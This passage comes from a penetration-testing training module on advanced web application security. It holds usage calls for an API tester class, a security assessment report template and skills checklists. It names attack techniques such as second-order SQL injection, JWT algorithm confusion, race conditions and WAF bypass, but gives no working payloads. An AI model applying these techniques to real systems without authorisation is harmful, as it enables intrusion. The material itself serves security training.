# Usage
tester = APISecurityTester('https://api.target.com', 'your_auth_token')
tester.test_mass_assignment('/users/profile', {'name': 'John', 'email': 'john@example.com'})
tester.test_idor('/users/{id}', 100)
tester.test_rate_limiting('/api/sensitive-action', 50)
```

### **📝 Deliverable: Advanced Web Application Security Assessment Report**

Create a professional security assessment report including:

```markdown
# Advanced Web Application Security Assessment

## Executive Summary
[High-level findings focused on business impact]

## Methodology
[Advanced testing techniques and tools used]

## Critical Findings

### 1. Business Logic Vulnerabilities
#### Race Condition in Payment Processing
- **Risk Level:** Critical
- **Business Impact:** Financial loss, fraudulent transactions
- **Proof of Concept:** [Detailed steps to reproduce]
- **Remediation:** Implement proper transaction locking and validation

### 2. Advanced Injection Vulnerabilities
#### Second-Order SQL Injection
- **Location:** User profile update functionality
- **Payload:** [Specific injection payload used]
- **Impact:** Full database compromise
- **Remediation:** Parameterized queries and input validation

### 3. Authentication and Authorization Flaws
#### JWT Algorithm Confusion Attack
- **Vulnerability:** RS256 to HS256 downgrade
- **Exploitation:** [JWT manipulation technique]
- **Impact:** Privilege escalation to administrator
- **Remediation:** Strict algorithm validation

## Advanced Attack Scenarios
### Multi-Stage Attack Chain
[Detailed description of vulnerability chaining]

## Risk Assessment Matrix
[Quantified risk analysis with business impact]

## Recommendations
### Immediate Actions (0-30 days)
### Short-term Improvements (30-90 days)
### Long-term Strategic Changes (90+ days)

## Appendices
### Tool Outputs and Raw Data
### Custom Scripts and Exploits Developed
### Additional Technical Details
```

---

## ✅ Module 3.1 Assessment

### **Advanced Knowledge Check:**
- [ ] Can identify and exploit business logic vulnerabilities
- [ ] Demonstrates advanced injection techniques beyond basic payloads
- [ ] Successfully chains multiple vulnerabilities for maximum impact
- [ ] Understands and exploits modern authentication mechanisms (JWT, OAuth 2.0)
- [ ] Can bypass advanced web application security controls
- [ ] Performs comprehensive API security assessment including GraphQL
- [ ] Develops custom tools and exploits for specific vulnerabilities

### **Expert Skills Verification:**
- [ ] Conducted advanced web application assessment using multiple sophisticated techniques
- [ ] Identified and exploited complex business logic flaws
- [ ] Successfully bypassed modern security controls and filters
- [ ] Demonstrated ability to develop custom exploitation tools
- [ ] Created professional assessment report with executive-level communication

### **Self-Assessment Questions:**
1. How do you identify and exploit race conditions in web applications?
2. What are the key differences between algorithm confusion and signature bypass attacks on JWT?
3. How can you chain CSRF, XSS, and privilege escalation vulnerabilities?
4. What advanced techniques can be used to bypass modern WAF protections?
5. How do you assess the security of GraphQL implementations?

### **Next Steps:**
✅ **Ready for Module 3.2: Wireless Security**

---

## 🎯 Module 3.1 Complete!

**Congratulations!** You've mastered advanced web application security techniques. You now understand:
- Complex vulnerability identification and exploitation beyond OWASP Top 10
- Advanced injection techniques and filter bypass methods
- Business logic vulnerability assessment and exploitation
- Modern authentication and authorization attack techniques
- API security assessment including GraphQL and REST APIs
- Custom tool development for specific attack scenarios
- Professional-level security assessment and reporting

**⏭️ Next:** [Module 3.2: Wireless Security](Module-3.2-Wireless-Security.md)

---

*Remember: Advanced web application security requires deep understanding of both technical vulnerabilities and business logic. Always focus on demonstrating real-world impact to drive meaningful security improvements.*
